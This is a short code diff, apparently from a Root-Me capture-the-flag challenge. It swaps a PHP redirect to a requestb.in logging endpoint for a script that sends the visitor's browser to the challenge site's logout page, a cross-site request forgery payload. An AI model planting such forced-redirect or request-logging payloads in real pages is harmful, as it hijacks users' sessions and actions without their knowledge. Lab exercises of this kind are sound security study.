@@ -1,2 +1,1 @@
-<?php
-header("Location: http://requestb.in/15w8krh1?csrfbla=oui";); ?>
+<script>window.location.replace('http://challenge01.root-me.org/realiste/ch7/hackers.php?page=deconnect')</script>
